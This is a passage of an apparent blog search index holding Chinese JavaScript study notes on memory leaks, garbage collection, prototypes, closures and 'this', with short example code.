          "slug": "如何检测js内存泄漏",
          "normalizedTitle": "如何检测js内存泄漏",
          "charIndex": 1173
        },
        {
          "level": 3,
          "title": "一些内存泄漏的场景",
          "slug": "一些内存泄漏的场景",
          "normalizedTitle": "一些内存泄漏的场景",
          "charIndex": 2556
        }
      ],
      "headersStr": "内存泄露和垃圾回收 内存泄漏 垃圾回收 如何检测Js内存泄漏 一些内存泄漏的场景",
      "content": "# 内存泄露和垃圾回收\n\n\n# 内存泄漏\n\n * 不再用到的内存，没有及时释放，就叫做内存泄漏\n * 内存泄露就是不再被需要的内存, 由于某种原因,非预期, 无法被释放\n\n\n# 垃圾回收\n\n# 原理\n\n垃圾收集器会按照固定的时间间隔或代码执行中预约的收集时间，周期性地执行如下操做——找出再也不继续使用的变量，而后释放其占用的内存\n\n# 方法\n\n * 标记清除法(新) 当变量进入环境时，就标记这个变量为进入环境,从逻辑上讲，永远不能释放进入环境的变量所占的内存，永远不能释放进入环境变量所占用的内存，只要执行流程进入相应的环境，就可能用到他们。当离开环境时，就标记为离开环境。\n\n垃圾回收器在运行的时候会给存储在内存中的变量都加上标记（所有都加），然后去掉环境变量中的变量，以及被环境变量中的变量所引用的变量（条件性去除标记），删除所有被标记的变量，删除的变量无法在环境变量中被访问所以会被删除，最后垃圾回收器，完成了内存的清除工作，并回收他们所占用的内存\n\n * 引用计数法(旧) 当声明了一个变量并将一个引用类型值赋给该变量时，则该值的引用次数就是1；若是同一个值又被赋给另外一个变量，则该值的引用次数加1；若是包含对该值引用的变量又取得了另一个值，则该值的引用次数减1。当该值的引用次数变为0时，则能够回收其占用的内存空间。当垃圾回收器下一次运行时，就会释放那些引用次数为0的值所占用的内存\n\n晕吧... 举个例子 只要有引用堆内存的地方，引用计数就要加1。如果一个值的引用次数是0，就表示这个值不再用到了，因此可以将这块内存释放。\n\nvar a =[1,2]\nvar b = a\na = null\nconsole.log(b)\n//1.[1,2]这个数组开辟了一块内存，变量a对其引用了，所以引用计数为1。\n//2.变量b也引用了这个数组，引用计数为2。\n//3.a变量回收，引用计数为1\n//4.因为引用计数不为0，所以b打印[1,2]\n\n\n * 闭包中的数据常驻内存的场景\n   注:预期的引用导致数据不被回收，严格来说闭包不属于内存泄漏，只是闭包的数据不可以被回收\n\nfunction getData(){\n  const data = {}\n  return {\n    get(key){\n      return data[key]\n    },\n    set(value){\n      data[key]=value\n    }\n  }\n}\nconst {get,set} = getData()\nset('a',100)\nget('a')\n//当set执行之后，data中的数据会存储并且不会被回收，但这也是使用此闭包的预期结果，所以说闭包不是内存泄漏，这也是为什么慎用闭包的原因，因为数据变量的常驻内存\n\n\n\n# 如何检测Js内存泄漏\n\n可使用 Chrome devTools Performance 来检测内存变化\n\n * 刷新页面，点击“GC”按钮\n * 点击“Record”按钮开始记录，然后操作页面\n * 操作结束，点击“GC”按钮，点击“结束”按钮，看分析结果\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>memory change</title>\n</head>\n<body>\n    <p>\n        memory change\n        <button id=\"btn1\">start</button>\n    </p>\n\n    <script>\n        const arr = []\n        for (let i = 0; i < 10 * 10000; i++) {\n            arr.push(i)\n        }\n\n        function bind() {\n            // 模拟一个比较大的数据\n            const obj = {\n                str: JSON.stringify(arr) // 简单的拷贝\n            }\n\n            window.addEventListener('resize', () => {\n                console.log(obj)\n            })\n        }\n\n        let n = 0\n        function start() {\n            setTimeout(() => {\n                bind()\n                n++\n\n                // 执行 50 次\n                if (n < 50) {\n                    start()\n                } else {\n                    alert('done')\n                }\n            }, 200)\n        }\n\n        document.getElementById('btn1').addEventListener('click', () => {\n            start()\n        })\n    </script>\n</body>\n</html>\n\n\n如图：\n\n- 图中的HEAP(堆)内存呈现主键升高的趋势，说明内存不断被垃圾占用，而垃圾缺得不到回收清楚。 - 正常的代码运行，应该呈现内存增长，一段时间后垃圾被回收内存下降，如此循环...\n\n\n# 一些内存泄漏的场景\n\n * Vue中的事件总线event.bus在组件销毁时不被销毁\n * Dom的一些操作,addEventListener...,\n * 全局变量，未被销毁的setTimeout，setInterval\n\n# 一些基本的代码操作\n\n * 组件销毁时(beforeUnmount),使用bus.off,removeEventListener,clearInterval,clearTimeout....\n\n# WeakMap,WeakSet\n\nWeakMap,Map,Set\n\nWeakMap WeakSet 弱引用，不会影响垃圾回收。\n\n// 函数执行完，obj 会被销毁，因为外面的 WeakMap 是“弱引用”，不算在内\nconst wMap = new WeakMap()\nfunction fn() {\n    const obj = {\n        name: 'zhangsan'\n    }\n    // 注意，WeakMap 专门做弱引用的，因此 WeakMap 只接受对象作为键名（`null`除外），不接受其他类型的值作为键名。其他的无意义\n    wMap.set(obj, 100) \n}\nfn()\n// 代码执行完毕之后，obj 会被销毁，wMap 中也不再存在。但我们无法第一时间看到效果。因为：\n// 内存的垃圾回收机制，不是实时的，而且是 JS 代码控制不了的，因此这里不一定能直接看到效果。\n\n\n// 函数执行完，obj 会被销毁，因为外面的 WeakSet 是“弱引用”，不算在内\nconst wSet = new WeakSet()\nfunction fn() {\n    const obj = {\n        name: 'zhangsan'\n    }\n    wSet.add(obj) // 注意，WeakSet 就是为了做弱引用的，因此不能 add 值类型！！！无意义\n}\nfn()\n",
      "normalizedContent": "# 内存泄露和垃圾回收\n\n\n# 内存泄漏\n\n * 不再用到的内存，没有及时释放，就叫做内存泄漏\n * 内存泄露就是不再被需要的内存, 由于某种原因,非预期, 无法被释放\n\n\n# 垃圾回收\n\n# 原理\n\n垃圾收集器会按照固定的时间间隔或代码执行中预约的收集时间，周期性地执行如下操做——找出再也不继续使用的变量，而后释放其占用的内存\n\n# 方法\n\n * 标记清除法(新) 当变量进入环境时，就标记这个变量为进入环境,从逻辑上讲，永远不能释放进入环境的变量所占的内存，永远不能释放进入环境变量所占用的内存，只要执行流程进入相应的环境，就可能用到他们。当离开环境时，就标记为离开环境。\n\n垃圾回收器在运行的时候会给存储在内存中的变量都加上标记（所有都加），然后去掉环境变量中的变量，以及被环境变量中的变量所引用的变量（条件性去除标记），删除所有被标记的变量，删除的变量无法在环境变量中被访问所以会被删除，最后垃圾回收器，完成了内存的清除工作，并回收他们所占用的内存\n\n * 引用计数法(旧) 当声明了一个变量并将一个引用类型值赋给该变量时，则该值的引用次数就是1；若是同一个值又被赋给另外一个变量，则该值的引用次数加1；若是包含对该值引用的变量又取得了另一个值，则该值的引用次数减1。当该值的引用次数变为0时，则能够回收其占用的内存空间。当垃圾回收器下一次运行时，就会释放那些引用次数为0的值所占用的内存\n\n晕吧... 举个例子 只要有引用堆内存的地方，引用计数就要加1。如果一个值的引用次数是0，就表示这个值不再用到了，因此可以将这块内存释放。\n\nvar a =[1,2]\nvar b = a\na = null\nconsole.log(b)\n//1.[1,2]这个数组开辟了一块内存，变量a对其引用了，所以引用计数为1。\n//2.变量b也引用了这个数组，引用计数为2。\n//3.a变量回收，引用计数为1\n//4.因为引用计数不为0，所以b打印[1,2]\n\n\n * 闭包中的数据常驻内存的场景\n   注:预期的引用导致数据不被回收，严格来说闭包不属于内存泄漏，只是闭包的数据不可以被回收\n\nfunction getdata(){\n  const data = {}\n  return {\n    get(key){\n      return data[key]\n    },\n    set(value){\n      data[key]=value\n    }\n  }\n}\nconst {get,set} = getdata()\nset('a',100)\nget('a')\n//当set执行之后，data中的数据会存储并且不会被回收，但这也是使用此闭包的预期结果，所以说闭包不是内存泄漏，这也是为什么慎用闭包的原因，因为数据变量的常驻内存\n\n\n\n# 如何检测js内存泄漏\n\n可使用 chrome devtools performance 来检测内存变化\n\n * 刷新页面，点击“gc”按钮\n * 点击“record”按钮开始记录，然后操作页面\n * 操作结束，点击“gc”按钮，点击“结束”按钮，看分析结果\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>memory change</title>\n</head>\n<body>\n    <p>\n        memory change\n        <button id=\"btn1\">start</button>\n    </p>\n\n    <script>\n        const arr = []\n        for (let i = 0; i < 10 * 10000; i++) {\n            arr.push(i)\n        }\n\n        function bind() {\n            // 模拟一个比较大的数据\n            const obj = {\n                str: json.stringify(arr) // 简单的拷贝\n            }\n\n            window.addeventlistener('resize', () => {\n                console.log(obj)\n            })\n        }\n\n        let n = 0\n        function start() {\n            settimeout(() => {\n                bind()\n                n++\n\n                // 执行 50 次\n                if (n < 50) {\n                    start()\n                } else {\n                    alert('done')\n                }\n            }, 200)\n        }\n\n        document.getelementbyid('btn1').addeventlistener('click', () => {\n            start()\n        })\n    </script>\n</body>\n</html>\n\n\n如图：\n\n- 图中的heap(堆)内存呈现主键升高的趋势，说明内存不断被垃圾占用，而垃圾缺得不到回收清楚。 - 正常的代码运行，应该呈现内存增长，一段时间后垃圾被回收内存下降，如此循环...\n\n\n# 一些内存泄漏的场景\n\n * vue中的事件总线event.bus在组件销毁时不被销毁\n * dom的一些操作,addeventlistener...,\n * 全局变量，未被销毁的settimeout，setinterval\n\n# 一些基本的代码操作\n\n * 组件销毁时(beforeunmount),使用bus.off,removeeventlistener,clearinterval,cleartimeout....\n\n# weakmap,weakset\n\nweakmap,map,set\n\nweakmap weakset 弱引用，不会影响垃圾回收。\n\n// 函数执行完，obj 会被销毁，因为外面的 weakmap 是“弱引用”，不算在内\nconst wmap = new weakmap()\nfunction fn() {\n    const obj = {\n        name: 'zhangsan'\n    }\n    // 注意，weakmap 专门做弱引用的，因此 weakmap 只接受对象作为键名（`null`除外），不接受其他类型的值作为键名。其他的无意义\n    wmap.set(obj, 100) \n}\nfn()\n// 代码执行完毕之后，obj 会被销毁，wmap 中也不再存在。但我们无法第一时间看到效果。因为：\n// 内存的垃圾回收机制，不是实时的，而且是 js 代码控制不了的，因此这里不一定能直接看到效果。\n\n\n// 函数执行完，obj 会被销毁，因为外面的 weakset 是“弱引用”，不算在内\nconst wset = new weakset()\nfunction fn() {\n    const obj = {\n        name: 'zhangsan'\n    }\n    wset.add(obj) // 注意，weakset 就是为了做弱引用的，因此不能 add 值类型！！！无意义\n}\nfn()\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "原型和原型链",
      "frontmatter": {
        "title": "原型和原型链"
      },
      "regularPath": "/webstudy/Javascript/%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE.html",
      "relativePath": "webstudy/Javascript/原型和原型链.md",
      "key": "v-53a95d9b",
      "path": "/webstudy/Javascript/%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE.html",
      "headers": [
        {
          "level": 2,
          "title": "class",
          "slug": "class",
          "normalizedTitle": "class",
          "charIndex": 34
        },
        {
          "level": 2,
          "title": "继承",
          "slug": "继承",
          "normalizedTitle": "继承",
          "charIndex": 262
        },
        {
          "level": 2,
          "title": "instanceof",
          "slug": "instanceof",
          "normalizedTitle": "instanceof",
          "charIndex": 745
        },
        {
          "level": 3,
          "title": "原理",
          "slug": "原理",
          "normalizedTitle": "原理",
          "charIndex": 760
        },
        {
          "level": 3,
          "title": "几个例子",
          "slug": "几个例子",
          "normalizedTitle": "几个例子",
          "charIndex": 953
        },
        {
          "level": 3,
          "title": "手写instanceof",
          "slug": "手写instanceof",
          "normalizedTitle": "手写instanceof",
          "charIndex": 1127
        },
        {
          "level": 2,
          "title": "难理解的‘原型’",
          "slug": "难理解的-原型",
          "normalizedTitle": "难理解的‘原型’",
          "charIndex": 1682
        },
        {
          "level": 3,
          "title": "显式原型和隐式原型",
          "slug": "显式原型和隐式原型",
          "normalizedTitle": "显式原型和隐式原型",
          "charIndex": 1695
        },
        {
          "level": 3,
          "title": "基于原型的查找规则",
          "slug": "基于原型的查找规则",
          "normalizedTitle": "基于原型的查找规则",
          "charIndex": 1836
        },
        {
          "level": 2,
          "title": "原型链",
          "slug": "原型链",
          "normalizedTitle": "原型链",
          "charIndex": 798
        },
        {
          "level": 3,
          "title": "hasOwnProperty",
          "slug": "hasownproperty",
          "normalizedTitle": "hasownproperty",
          "charIndex": 1941
        },
        {
          "level": 3,
          "title": "那hasOwnProperty又是哪里的方法？",
          "slug": "那hasownproperty又是哪里的方法",
          "normalizedTitle": "那hasownproperty又是哪里的方法？",
          "charIndex": 2076
        },
        {
          "level": 2,
          "title": "new",
          "slug": "new",
          "normalizedTitle": "new",
          "charIndex": 234
        },
        {
          "level": 3,
          "title": "new做了什么",
          "slug": "new做了什么",
          "normalizedTitle": "new做了什么",
          "charIndex": 2118
        },
        {
          "level": 3,
          "title": "手写new",
          "slug": "手写new",
          "normalizedTitle": "手写new",
          "charIndex": 2227
        }
      ],
      "headersStr": "class 继承 instanceof 原理 几个例子 手写instanceof 难理解的‘原型’ 显式原型和隐式原型 基于原型的查找规则 原型链 hasOwnProperty 那hasOwnProperty又是哪里的方法？ new new做了什么 手写new",
      "content": "先上几个问题：\n\n * 1、如何判断一个变量是不是数组？\n * 2、class的原型本质？\n\n\n# class\n\nclass Student {\n  //构建实例\n  constructor(name,age){\n    this.name = name\n    this.age=age\n  }\n  say(){\n    console.log(`姓名${this.name},年龄${this.age}`)\n  }\n}\n//通过类声明对象实例\nconst a = new Student('yang',22)\n\n\n\n# 继承\n\n  //父类\n  class People {\n    constructor(name, age) {\n      this.name = name;\n      this.age = age;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age}`);\n    }\n  }\n  //子类\n  class Student extends People {\n    constructor(name, age, number) {\n      super(name, age); //super会调用父类的构造函数方法\n      this.number = number;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age},学号${this.number}`);\n    }\n  }\n  const a = new Student(\"yang\", 18, 1);\n  a.say();\n\n\n\n# instanceof\n\n\n# 原理\n\n用于检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上 什么意思呢？反过来理解一下 a.instance Array，a沿着自己的__proto__一层一层的寻找，是否可以找到Array.prototype(Array的显式原型)，直至找到Object.prototype后停止，因为Object.prototype.__proto__是null\n\n\n# 几个例子\n\n//借用上面的People和Student类\na instanceof People //true\na instanceof Student //true\na instanceof Object //true ,\n\n[] instanceof Array //true\n[] instanceof Object //true\n\n\n\n# 手写instanceof\n\nfunction copyInstanceof (source, target) {\n    // 基本数据类型以及 null 直接返回 false\n    if (!['function', 'object'].includes(typeof source) || source === null) return false\n    // getProtypeOf 是 Object 对象自带的一个方法，能够拿到参数的原型对象\n    let proto = Object.getPrototypeOf(source)\n    while (true) {\n        // 查找到尽头，还没找到\n        if (proto == null) return false\n        // 找到相同的原型对象\n        if (proto == target.prototype) return true\n        proto = Object.getPrototypeOf(proto)\n    }\n}\n\n\n\n以上表面的规则可以归结为，object是所有class的一个父类，Array也是Object，至于原理，请深入到‘原型‘......\n\n\n# 难理解的‘原型’\n\n\n# 显式原型和隐式原型\n\n通过instanceof引入原型，原型链子，从而理解instanceof的原理\n\n * 每一个class都有一个prototype显式原型\n * 每一个实例都有__proto__的隐式原型\n * 实例的__proto指向class的protptype\n\n\n# 基于原型的查找规则\n\n * 获取属性xialuo.name或执行xialuo.say()方法时\n * 先在自身的属性和方法中寻找\n * 如果找不到就自动去自己的__proto__中查找\n\n\n# 原型链\n\n\n# hasOwnProperty\n\nxialuo.hasOwnProperty(sayHi())   //false\n\n\n * hasOwnProperty表示是否有自己的属性。这个方法会查找一个对象是否有某个属性，但是不会去查找它的原型链回忆一下递归实现的深拷贝\n\n\n# 那hasOwnProperty又是哪里的方法？\n\n请看图：\n\n\n# new\n\n\n# new做了什么\n\n * 创建一个空对象\n * 空对象的内部属性 proto 赋值为构造函数的 prototype 属性\n * 将构造函数的 this 指向空对象\n * 执行构造函数内部代码\n * 返回该新对象\n\n\n# 手写new\n\nfunction _new(fn, ...arg) {\n  const obj = Object.create(fn.prototype);\n  const res = fn.apply(obj, arg);\n  return res instanceof Object ? res : obj;\n}\n",
      "normalizedContent": "先上几个问题：\n\n * 1、如何判断一个变量是不是数组？\n * 2、class的原型本质？\n\n\n# class\n\nclass student {\n  //构建实例\n  constructor(name,age){\n    this.name = name\n    this.age=age\n  }\n  say(){\n    console.log(`姓名${this.name},年龄${this.age}`)\n  }\n}\n//通过类声明对象实例\nconst a = new student('yang',22)\n\n\n\n# 继承\n\n  //父类\n  class people {\n    constructor(name, age) {\n      this.name = name;\n      this.age = age;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age}`);\n    }\n  }\n  //子类\n  class student extends people {\n    constructor(name, age, number) {\n      super(name, age); //super会调用父类的构造函数方法\n      this.number = number;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age},学号${this.number}`);\n    }\n  }\n  const a = new student(\"yang\", 18, 1);\n  a.say();\n\n\n\n# instanceof\n\n\n# 原理\n\n用于检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上 什么意思呢？反过来理解一下 a.instance array，a沿着自己的__proto__一层一层的寻找，是否可以找到array.prototype(array的显式原型)，直至找到object.prototype后停止，因为object.prototype.__proto__是null\n\n\n# 几个例子\n\n//借用上面的people和student类\na instanceof people //true\na instanceof student //true\na instanceof object //true ,\n\n[] instanceof array //true\n[] instanceof object //true\n\n\n\n# 手写instanceof\n\nfunction copyinstanceof (source, target) {\n    // 基本数据类型以及 null 直接返回 false\n    if (!['function', 'object'].includes(typeof source) || source === null) return false\n    // getprotypeof 是 object 对象自带的一个方法，能够拿到参数的原型对象\n    let proto = object.getprototypeof(source)\n    while (true) {\n        // 查找到尽头，还没找到\n        if (proto == null) return false\n        // 找到相同的原型对象\n        if (proto == target.prototype) return true\n        proto = object.getprototypeof(proto)\n    }\n}\n\n\n\n以上表面的规则可以归结为，object是所有class的一个父类，array也是object，至于原理，请深入到‘原型‘......\n\n\n# 难理解的‘原型’\n\n\n# 显式原型和隐式原型\n\n通过instanceof引入原型，原型链子，从而理解instanceof的原理\n\n * 每一个class都有一个prototype显式原型\n * 每一个实例都有__proto__的隐式原型\n * 实例的__proto指向class的protptype\n\n\n# 基于原型的查找规则\n\n * 获取属性xialuo.name或执行xialuo.say()方法时\n * 先在自身的属性和方法中寻找\n * 如果找不到就自动去自己的__proto__中查找\n\n\n# 原型链\n\n\n# hasownproperty\n\nxialuo.hasownproperty(sayhi())   //false\n\n\n * hasownproperty表示是否有自己的属性。这个方法会查找一个对象是否有某个属性，但是不会去查找它的原型链回忆一下递归实现的深拷贝\n\n\n# 那hasownproperty又是哪里的方法？\n\n请看图：\n\n\n# new\n\n\n# new做了什么\n\n * 创建一个空对象\n * 空对象的内部属性 proto 赋值为构造函数的 prototype 属性\n * 将构造函数的 this 指向空对象\n * 执行构造函数内部代码\n * 返回该新对象\n\n\n# 手写new\n\nfunction _new(fn, ...arg) {\n  const obj = object.create(fn.prototype);\n  const res = fn.apply(obj, arg);\n  return res instanceof object ? res : obj;\n}\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "作用域和闭包",
      "frontmatter": {
        "title": "作用域和闭包"
      },
      "regularPath": "/webstudy/Javascript/%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85.html",
      "relativePath": "webstudy/Javascript/作用域和闭包.md",
      "key": "v-2c8f5265",
      "path": "/webstudy/Javascript/%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85.html",
      "headers": [
        {
          "level": 2,
          "title": "作用域和自由变量",
          "slug": "作用域和自由变量",
          "normalizedTitle": "作用域和自由变量",
          "charIndex": 58
        },
        {
          "level": 3,
          "title": "作用域",
          "slug": "作用域",
          "normalizedTitle": "作用域",
          "charIndex": 58
        },
        {
          "level": 3,
          "title": "自由变量",
          "slug": "自由变量",
          "normalizedTitle": "自由变量",
          "charIndex": 62
        },
        {
          "level": 3,
          "title": "一道题目",
          "slug": "一道题目",
          "normalizedTitle": "一道题目",
          "charIndex": 366
        },
        {
          "level": 2,
          "title": "闭包（Closure）",
          "slug": "闭包-closure",
          "normalizedTitle": "闭包（closure）",
          "charIndex": 809
        },
        {
          "level": 3,
          "title": "那什么是闭包？",
          "slug": "那什么是闭包",
          "normalizedTitle": "那什么是闭包？",
          "charIndex": 858
        },
        {
          "level": 3,
          "title": "闭包的应用场景",
          "slug": "闭包的应用场景",
          "normalizedTitle": "闭包的应用场景",
          "charIndex": 1439
        },
        {
          "level": 3,
          "title": "优点和缺点",
          "slug": "优点和缺点",
          "normalizedTitle": "优点和缺点",
          "charIndex": 3714
        },
        {
          "level": 3,
          "title": "柯里化函数",
          "slug": "柯里化函数",
          "normalizedTitle": "柯里化函数",
          "charIndex": 3915
        },
        {
          "level": 2,
          "title": "this",
          "slug": "this",
          "normalizedTitle": "this",
          "charIndex": 11
        },
        {
          "level": 3,
          "title": "使用场景",
          "slug": "使用场景",
          "normalizedTitle": "使用场景",
          "charIndex": 3982
        },
        {
          "level": 3,
          "title": "普通函数中的this",
          "slug": "普通函数中的this",
          "normalizedTitle": "普通函数中的this",
          "charIndex": 4063
        },
        {
          "level": 3,
          "title": "使用call，apply，bind调用",
          "slug": "使用call-apply-bind调用",
          "normalizedTitle": "使用call，apply，bind调用",
          "charIndex": 4004
        },
        {
          "level": 3,
          "title": "this作为对象，方法被调用",
          "slug": "this作为对象-方法被调用",
          "normalizedTitle": "this作为对象，方法被调用",
          "charIndex": 4305
        },
        {
          "level": 3,
          "title": "class中的this",
          "slug": "class中的this",
          "normalizedTitle": "class中的this",
          "charIndex": 4448
        },
        {
          "level": 3,
          "title": "箭头函数this",
          "slug": "箭头函数this",
          "normalizedTitle": "箭头函数this",
          "charIndex": 4492
        },
        {
          "level": 3,
          "title": "原型链中的this",
          "slug": "原型链中的this",
          "normalizedTitle": "原型链中的this",
          "charIndex": 5142
        },
        {
          "level": 2,
          "title": "手写bind函数",
          "slug": "手写bind函数",
          "normalizedTitle": "手写bind函数",
          "charIndex": 31
        }
      ],
      "headersStr": "作用域和自由变量 作用域 自由变量 一道题目 闭包（Closure） 那什么是闭包？ 闭包的应用场景 优点和缺点 柯里化函数 this 使用场景 普通函数中的this 使用call，apply，bind调用 this作为对象，方法被调用 class中的this 箭头函数this 原型链中的this 手写bind函数",
      "content": "思考几个问题\n\n * this的不同应用场景如何取值？\n * 手写bind函数\n * 闭包开发中的应用场景\n\n\n# 作用域和自由变量\n\n\n# 作用域\n\n * 全局作用域\n * 函数作用域\n * 块级作用域\n\n# 块级作用域\n\nES6,块作用域由 { } 包括，if语句和for语句里面的{ }也属于块作用域\n\nif(true) {\n  let a= 100  //let、const声明的变量,只能在块作用域中被访问，和var区别\n}\nconsole.log(a) //ReferenceError: a is not defined\n\n\n\n# 自由变量\n\n * 一个变量在当前作用域没有被定义但被使用了\n * 会向上级作用域一层一层寻找，直到找到为止\n * 如果全局都没有找到，会报错xxx is not defined\n\n\n# 一道题目\n\n生成10个a标签，点击每个a标签时弹出对应index\n\nlet i, a;\n  for (i = 0; i <= 10; i++) {\n    a = document.createElement(\"a\");\n    a.innerHTML = i + \"<br>\";\n    a.addEventListener(\"click\", function (e) {\n      e.preventDefault();\n      alert(i);\n    });\n    document.body.appendChild(a);\n  }\n//很明晰这个代码是错误的，alert全部是10，为什么？\n//当为每个标签添加click时，for循环10次已经执行完了，此时i是10，alert(i)时i是全局作用域所以弹出10.\n//如何修改？\nlet a\nfor(let i = 0;....) //块级作用域，每次for循环都会形成一个新的块，1，2，3....\n\n\n\n# 闭包（Closure）\n\n作用域应用的特殊情况，函数作为参数被传递，函数作为返回值被返回\n\n\n# 那什么是闭包？\n\n * 要理解闭包，首先理解javascript特殊的变量作用域，变量的作用域无非就是两种：全局变量，局部变量。\n * javascript语言的特殊处就是函数内部可以读取外部作用域中的变量。\n * 我们有时候需要得到函数内的局部变量，但是在正常情况下，这是不能读取到的，这时候就需要用到闭包。在javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包是指有权访问另一个函数作用域中的变量的函数。其本质是函数的作用域链中保存着外部函数变量对象的引用。\n\n\n//函数作为返回值 \nfunction create(){\n  const a = 100\n  return function(){\n    console.log('a :>> ', a);\n  }\n}\nconst fn= create()\nconst a = 200\nfn() //100\n// 函数作为参数\nfunction print(fn){\n  const a = 200\n  fn()\n}\nconst a = 100\nfunction fn(){\n  console.log(a)\n}\nprint(fn) //100\n//自由变量的查找，是在函数定义的位置向上级作用域查找，而不是在函数执行的位置\n\n\n\n# 闭包的应用场景\n\n# 1、一个缓存的插件（封装对象的私有属性和方法）\n\n// 闭包隐藏数据，只提供 API\nfunction createCache() {\n    const num=100\n    const data = {} // 闭包中的数据，被隐藏，不被外界访问\n    return {\n        num:num,\n        set: function (key, val) {\n            data[key] = val\n        },\n        get: function (key) {\n            return data[key]\n        }\n    }\n}\n \nconst c = createCache()\nconsole.log(c.num)//num此时就作为c私有属性\nc.set('a', 100) //set此时作为c的私有方法\nconsole.log( c.get('a') )\n\n\n# 2、闭包作用回调函数\n\n * 获取数组中某一区间的数值(实际业务开发中获取某一价格区间的商品)\n\n function between(a, b) {\n    return function (v) {\n      return v >= a && v <= b;\n    };\n  }\n  const arr = [2, 5, 6, 7, 8, 3, 11, 2, 1, 8, 9];\n  const newArr = arr.filter(between(2, 6));\n  console.log(\"newArr :>> \", newArr);\n\n\n * 根据某种条件获得购物车中的商品升序 根据闭包封装，获取当前购物车内信息，根据价格或者点击次数进行排序\n\n  const product = [\n    {id: 1,name: \"a\",price: 90,click: 100,},\n    {id: 1,name: \"b\",price: 100,click: 20,},\n    {id: 1,name: \"c\",price: 160,click: 80,},\n    {id: 1,name: \"d\",price: 22,click: 45,},\n  ];\nfunction order(field) {\n  return function(a,b){\n    return a[field]-b[field]\n  }\n}\nconst OrderByPrice = product.sort(order('price')) //通过价格排序\nconsole.log('OrderByPrice :>> ', OrderByPrice);\nconst OrderByClick = product.sort(order('click'))//通过用户点击次数排序\nconsole.log('OrderByClick :>> ', OrderByClick);\n\n\n# 3、函数防抖和截流\n\n//截流\nconst throttle = (fn, wait) => {\n let preTime = Date.now()\n return function() {\n  if(Date.now() - pre > wait) {\n   fn()\n    preTime = Date.now()\n  }\n }\n}\n\n//防抖\nvar debounce = function(func, delay) {\n     var timer = null\n     return function() {\n         var that = this;\n         var args = arguments;\n          \n         if(timer) {\n             clearTimeout(timer);\n         }\n    \n         timer = setTimeout(function() {\n             func.apply(that, args);\n         }, delay)\n     }\n}\n\n\n# 4、单例模式\n\n * 保证一个类仅有一个实例，并提供一个访问它的全局访问点\n\nvar Head = (function () {\n    var HeadClass = function () { }; // 声明HeadClass对象，无法在外部直接调用\n    var instance; // 声明一个instance对象\n    return function () {\n        if (instance) { // 如果已存在 则返回instance\n            return instance;\n        }\n        instance = new HeadClass() // 如果不存在 则new一个\n        return instance;\n    }\n})();\nvar a = Head();\nvar b = new Head();\nconsole.log(a===b) // true\nvar a = HeadClass(); // 报错,HeadClass is not defined\n\n\n\n\n# 优点和缺点\n\n# 优点\n\n * 1、变量长期存在于内存中，可随时被使用\n * 2、全局变量易造成全局的变量污染，闭包通过局部变量和全局变量结合使用，通过作用域控制，可以重复使用变量，不会造成变量污染\n\n# 缺点\n\n * 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题\n * 但闭包不属于内存泄漏，预期的引用导致数据不被回收，不属于内存泄漏\n\n\n# 柯里化函数\n\n待补充\n\n\n# this\n\n一篇知乎 this的指向\n\nthis的取值是在函数执行时确认，不是定义时确认 🎉\n\n\n# 使用场景\n\n * 作为普通函数被调用\n * 使用call，apply，bind调用\n * 作为对象，方法被调用\n * class中被调用\n * 箭头函数\n\n\n# 普通函数中的this\n\n// 作为普通函数被调用\nfunction fn1(){\n  console.log(this)\n}\nfn1() //window\n\n\n\n# 使用call，apply，bind调用\n\n//使用call，apply，bind\nfn1.call({x:100}) //{x:100}\nconst fn2 = fn1.bind({x:200})\nfn2()\n\n\nbind和call的区别？请注意：调用bind过程中不会执行方法,只会返回一个方法,然后再执行\n\n\n# this作为对象，方法被调用\n\n以上wait中的this执行有什么区别呢？\n * **左图:**setTimeout中的function执行，相当于普通函数的执行，所以this指向window\n * 右图:箭头函数的本身没有自己的this，this永远取他上级作用域的this\n\n\n# class中的this\n\n- 类的方法内部如果含有this，它默认指向类的实例\n\n\n# 箭头函数this\n\n * 箭头函数的本身没有自己的this，this永远取他上级作用域的this\n\n//请看下面的对比\n//1、this作为对象的方法被调用\nlet info = {\n  name:'yang',\n  get:function(){\n    return this.name\n  }\n}\nconsole.log('info.get() :>> ', info.get()); //yang\n//2、this在闭包中的表现\nlet info = {\n  name:'yang',\n  get:function(){\n    return function(){\n      return this.name\n    }\n  }\n}\nlet a = info.get()\n//下一步当执行a时候，this指向当前函数所在的对象window，window中无name属性\nconsole.log(a()) //undefined\n//如何解决这个问题？（使用箭头函数）\nlet info = {\n  name:'yang',\n  get:function(){\n    return ()=>{ //通过箭头函数的this指向其上下文\n      console.log('this :>> ', this);\n      return this.name\n    }\n  }\n}\nlet a = info.get()\nconsole.log('a() :>> ', a());\n\n\n\n# 原型链中的this\n\nclass People {\n    constructor(name, age) {\n      this.name = name;\n      this.age = age;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age}`);\n    }\n  }\n  //子类\n  class Student extends People {\n    constructor(name, age, number) {\n      super(name, age); //super会调用父类的构造函数方法\n      this.number = number;\n    }\n    sayHi() {\n      console.log(`姓名${this.name},年龄${this.age},学号${this.number}`);\n    }\n  }\n  const a = new Student(\"yang\", 